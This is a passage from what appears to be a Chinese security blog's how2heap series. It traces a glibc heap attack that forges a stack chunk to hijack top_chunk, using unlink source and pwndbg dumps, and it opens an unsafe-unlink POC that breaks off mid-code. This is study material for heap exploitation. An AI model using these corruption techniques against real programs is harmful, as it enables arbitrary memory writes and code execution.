class="comment">//p==0x555555757290-0xffffd555557594f0==0x7fffffffdda0（stack上的fake_chunk地址）</span></span><br><span class="line">  unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进入 unlink（之前说过，这里就不详细说了）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))  【检查<span class="number">1</span>】</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))【检查<span class="number">2</span>】</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        <span class="comment">//......</span></span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">16</span>gx fake_chunk</span><br><span class="line"><span class="number">0x7fffffffdda0</span>:<span class="number">0x0000000000000100</span><span class="number">0xffffd555557594f0</span> #fake_chunk ###（P）</span><br><span class="line"><span class="comment">//next_chunk(P)==next_chunk(0x7fffffffdda0)==0x7fffffffdda0+0xffffd555557594f0</span></span><br><span class="line"><span class="comment">//               ==0x555555757290</span></span><br><span class="line"><span class="comment">//prev_size(0x555555757290)==0xffffd555557594f0</span></span><br><span class="line">#【检查<span class="number">1</span>】:prev_size (next_chunk(P))==<span class="number">0xffffd555557594f0</span></span><br><span class="line"><span class="number">0x7fffffffddb0</span>:<span class="number">0x00007fffffffdda0</span><span class="number">0x00007fffffffdda0</span></span><br><span class="line">    #fake_fd#fake_bk</span><br><span class="line"><span class="number">0x7fffffffddc0</span>:<span class="number">0x00007fffffffdda0</span><span class="number">0x00007fffffffdda0</span></span><br><span class="line">    #fake_fd_nextsize   #fake_bk_nextsize</span><br><span class="line"><span class="number">0x7fffffffddd0</span>:<span class="number">0x00007fffffffdec0</span><span class="number">0xf909b2766ba8f000</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffdde0</span>:<span class="number">0x0000555555554cb0</span><span class="number">0x00007ffff7a03bf7</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffddf0</span>:<span class="number">0x0000000000000001</span><span class="number">0x00007fffffffdec8</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffde00</span>:<span class="number">0x000000010000c000</span><span class="number">0x00005555555548ea</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffde10</span>:<span class="number">0x0000000000000000</span><span class="number">0xf3b7ecd8324615b4</span> #这些内存不重要</span><br><span class="line">--------------------------------------------------------------------</span><br><span class="line">pwndbg&gt; x/<span class="number">300</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000041</span> <span class="meta">#a--malloc(0x38)</span></span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757270</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757280</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555757290</span>:<span class="number">0xffffd555557594f0</span><span class="number">0x0000000000000500</span> <span class="meta">#b--malloc(0x4f8)</span></span><br><span class="line">#【检查<span class="number">1</span>】:chunksize(P)==<span class="number">0x500</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757790</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000020871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757950</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd;<span class="comment">//FD==0x00007fffffffdda0-&gt;fd==0x00007fffffffdda0</span></span><br><span class="line">BK = P-&gt;bk;<span class="comment">//BK==0x00007fffffffdda0-&gt;bk==0x00007fffffffdda0</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))【检查<span class="number">2</span>】</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"><span class="comment">//FD-&gt;bk==0x00007fffffffdda0-&gt;bk==0x00007fffffffdda0==P</span></span><br><span class="line"><span class="comment">//BK-&gt;fd==0x00007fffffffdda0-&gt;fd==0x00007fffffffdda0==P</span></span><br></pre></td></tr></table></figure><p>继续看一下 unlink 中的步骤：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;</span></span><br><span class="line">......</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">//FD==BK==0x00007fffffffdda0</span></span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x7fffffffdda0</span></span><br><span class="line"><span class="number">0x7fffffffdda0</span>:<span class="number">0x0000000000000100</span><span class="number">0xffffd555557594f0</span> #fake_chunk  ###（P）</span><br><span class="line"><span class="number">0x7fffffffddb0</span>:<span class="number">0x00007fffffffdda0</span><span class="number">0x00007fffffffdda0</span></span><br><span class="line">    #fake_fd#fake_bk</span><br><span class="line"><span class="number">0x7fffffffddc0</span>:<span class="number">0x00007fffffffdda0</span><span class="number">0x00007fffffffdda0</span></span><br><span class="line">    #fake_fd_nextsize   #fake_bk_nextsize</span><br><span class="line"><span class="number">0x7fffffffddd0</span>:<span class="number">0x00007fffffffdec0</span><span class="number">0xf909b2766ba8f000</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffdde0</span>:<span class="number">0x0000555555554cb0</span><span class="number">0x00007ffff7a03bf7</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffddf0</span>:<span class="number">0x0000000000000001</span><span class="number">0x00007fffffffdec8</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffde00</span>:<span class="number">0x000000010000c000</span><span class="number">0x00005555555548ea</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffde10</span>:<span class="number">0x0000000000000000</span><span class="number">0xf3b7ecd8324615b4</span> #这些内存不重要</span><br><span class="line"><span class="comment">//执行完如上两步后内存未发生变化</span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))</span><br><span class="line">            <span class="comment">//chunksize_nomask (P)==0xffffd555557594f0</span></span><br><span class="line">            <span class="comment">//P-&gt;fd_nextsize==0x00007fffffffdda0</span></span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="comment">//进入if语句</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)<span class="comment">//【检查3】</span></span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))<span class="comment">//【检查4】</span></span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;<span class="comment">//进入else分支</span></span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">                #到此结束unlink</span><br><span class="line">                #内存和之前的一样，没有发生变化</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这些内容就体现出了之前的 fake_chunk 为什么这样伪造 😊。<br>（我原以为 fake chunk 中伪造的 fd_nextsize 和 bk_nextsize 是没有用的，现在看来是我格局小了，因为 chunksize_nomask (P)==0xffffd555557594f0 属于 large chunk，因此要绕过检查，另外 fake chunk 中的指针伪造的真巧妙）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123; <span class="comment">//下一个chunk不是top_chunk</span></span><br><span class="line"> <span class="comment">//......</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">      consolidate into top</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="comment">//下一个chunk是top_chunk</span></span><br><span class="line">      size += nextsize;</span><br><span class="line">        <span class="comment">//size==size+nextsize==0xffffd555557599f0+0x20871==0xffffd5555577a261</span></span><br><span class="line">      set_head(p, size | PREV_INUSE);</span><br><span class="line">      av-&gt;top = p;</span><br><span class="line">      check_chunk(av, p);</span><br><span class="line">    &#125;</span><br><span class="line">#set_head(p, size | PREV_INUSE)：</span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x7fffffffdda0</span></span><br><span class="line"><span class="number">0x7fffffffdda0</span>:<span class="number">0x0000000000000100</span><span class="number">0xffffd5555577a261</span> #fake_chunk</span><br><span class="line">   #<span class="number">0xffffd555557594f0</span></span><br><span class="line">                                   <span class="meta">#changed</span></span><br><span class="line"><span class="number">0x7fffffffddb0</span>:<span class="number">0x00007fffffffdda0</span><span class="number">0x00007fffffffdda0</span> ###（P）</span><br><span class="line">    #fake_fd#fake_bk</span><br><span class="line"><span class="number">0x7fffffffddc0</span>:<span class="number">0x00007fffffffdda0</span><span class="number">0x00007fffffffdda0</span></span><br><span class="line">    #fake_fd_nextsize   #fake_bk_nextsize</span><br><span class="line"><span class="number">0x7fffffffddd0</span>:<span class="number">0x00007fffffffdec0</span><span class="number">0xf909b2766ba8f000</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffdde0</span>:<span class="number">0x0000555555554cb0</span><span class="number">0x00007ffff7a03bf7</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffddf0</span>:<span class="number">0x0000000000000001</span><span class="number">0x00007fffffffdec8</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffde00</span>:<span class="number">0x000000010000c000</span><span class="number">0x00005555555548ea</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffde10</span>:<span class="number">0x0000000000000000</span><span class="number">0xf3b7ecd8324615b4</span> #这些内存不重要</span><br><span class="line"><span class="meta">#av-&gt;top = p;</span></span><br><span class="line"><span class="meta">#p==0x7fffffffdda0</span></span><br><span class="line">pwndbg&gt; p av-&gt;top</span><br><span class="line">$<span class="number">15</span> = (mchunkptr) <span class="number">0x7fffffffdda0</span></span><br><span class="line">pwndbg&gt;</span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x7fffffffdda0</span></span><br><span class="line"><span class="number">0x7fffffffdda0</span>:<span class="number">0x0000000000000100</span><span class="number">0xffffd5555577a261</span> #fake_chunk #!!!top_chunk</span><br><span class="line">   #<span class="number">0xffffd555557594f0</span></span><br><span class="line">                                   <span class="meta">#changed</span></span><br><span class="line"><span class="number">0x7fffffffddb0</span>:<span class="number">0x00007fffffffdda0</span><span class="number">0x00007fffffffdda0</span> ###（P）</span><br><span class="line">    #fake_fd#fake_bk</span><br><span class="line"><span class="number">0x7fffffffddc0</span>:<span class="number">0x00007fffffffdda0</span><span class="number">0x00007fffffffdda0</span></span><br><span class="line">    #fake_fd_nextsize   #fake_bk_nextsize</span><br><span class="line"><span class="number">0x7fffffffddd0</span>:<span class="number">0x00007fffffffdec0</span><span class="number">0xf909b2766ba8f000</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffdde0</span>:<span class="number">0x0000555555554cb0</span><span class="number">0x00007ffff7a03bf7</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffddf0</span>:<span class="number">0x0000000000000001</span><span class="number">0x00007fffffffdec8</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffde00</span>:<span class="number">0x000000010000c000</span><span class="number">0x00005555555548ea</span> #这些内存不重要</span><br><span class="line"><span class="number">0x7fffffffde10</span>:<span class="number">0x0000000000000000</span><span class="number">0xf3b7ecd8324615b4</span> #这些内存不重要</span><br></pre></td></tr></table></figure><p>现在 top_chunk 已经被“转移到了 top_chunk”，当我们再次 malloc 时就可以控制 stack memory</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620865293270-64fa037a-ee42-43e8-93d9-750bfa444fd3.png#clientId=uf8e79bf6-63ae-4&from=drop&id=uafcf1186&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-13%2008.21.26.png&originHeight=1604&originWidth=2750&originalType=binary&size=348921&status=done&style=none&taskId=u7e1d0f91-c0c8-48a6-9f31-8373cde15a8" alt="截屏2021-05-13 08.21.26.png"></p><h1 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h1><p>Q：<strong>POC 中 fake_chunk 的 fd_nextsize 和 bk_nextsize 的伪造是必须的吗，我能不能可以不伪造这两个地方？</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; <span class="comment">// prev_size is now used and must equal fake_chunk&#x27;s size to pass P-&gt;bk-&gt;size == P-&gt;prev_size</span></span><br><span class="line">fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>; <span class="comment">// size of the chunk just needs to be small enough to stay in the small bin</span></span><br><span class="line">fake_chunk[<span class="number">2</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// fwd</span></span><br><span class="line">fake_chunk[<span class="number">3</span>] = (<span class="keyword">size_t</span>) fake_chunk; <span class="comment">// bck</span></span><br><span class="line">fake_chunk[<span class="number">4</span>] = <span class="literal">NULL</span>; <span class="comment">//fwd_nextsize</span></span><br><span class="line">fake_chunk[<span class="number">5</span>] = <span class="literal">NULL</span>; <span class="comment">//bck_nextsize</span></span><br></pre></td></tr></table></figure><p>当然可以，我们在这里再来看一下 unlink 的过程，现在假如说 fake chunk 的 fd_nextsize 和 bk_nextsize==NULL：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line">    FD = P-&gt;fd;</span><br><span class="line">    BK = P-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        FD-&gt;bk = BK;</span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;<span class="comment">//现在P-&gt;fd_nextsize==NULL</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125; <span class="comment">//不会进入if语句，跳出unlink</span></span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620865596987-413afd0e-fbab-44d7-a709-acb509faf62e.png#clientId=uf8e79bf6-63ae-4&from=drop&id=uccbf2ee4&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-13%2008.26.25.png&originHeight=1610&originWidth=2750&originalType=binary&size=348033&status=done&style=none&taskId=u1bad206a-10fd-45f4-bba9-19e723259b0" alt="截屏2021-05-13 08.26.25.png"><br>这里来猜测一下为什么要加上 fd_nextsize 和 bk_nextsize：<br>这两个指针是 largebin 独有的指针，也就是说这里的 fake_chunk 也可以是 largebin 上的一个 free 堆块<br>（当然，直接向处于 malloc 状态写入内容或处于循环双向链表 free 的 chunk 也可以），只要可以绕过 unlink 的安全性检查即可：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620865973104-72470230-e06f-44f1-8e93-54f1f2a75c4d.png#clientId=uf8e79bf6-63ae-4&from=paste&height=354&id=u6d3e5739&margin=%5Bobject%20Object%5D&name=image.png&originHeight=708&originWidth=1842&originalType=binary&size=111508&status=done&style=none&taskId=u92fef697-ea53-4c55-80c1-b80caf5a8c7&width=921" alt="image.png"></p><blockquote><p>借用一下之前文章中的图片</p></blockquote><p>POC 的适用性更广罢了，2333 ～</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>how2heap(9)-unsafe_unlink</title>
    <link href="https://cyberangel.cn/2021/05/10/how2heap(9)-unsafe_unlink/"/>
    <id>https://cyberangel.cn/2021/05/10/how2heap(9)-unsafe_unlink/</id>
    <published>2021-05-10T12:09:43.000Z</published>
    <updated>2021-07-04T09:57:12.008Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一小节我们再次说明 unsafe unlink 这种攻击方式，为什么是再次说明？因为这种利用方式我们之前说过，但仍然是模棱两可（好吧，我承认当时完全没有看懂，这也就是我再看一遍漏洞的原因）：<br>在这片文章中我们将结合 malloc 源码进行重新分析。</p><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>所有 glibc malloc</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><h2 id="POC-源码"><a href="#POC-源码" class="headerlink" title="POC 源码"></a>POC 源码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 18.04.4 64bit.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> malloc_size = <span class="number">0x420</span>; <span class="comment">//we want to be big enough not to use tcache or fastbin</span></span><br><span class="line"><span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span 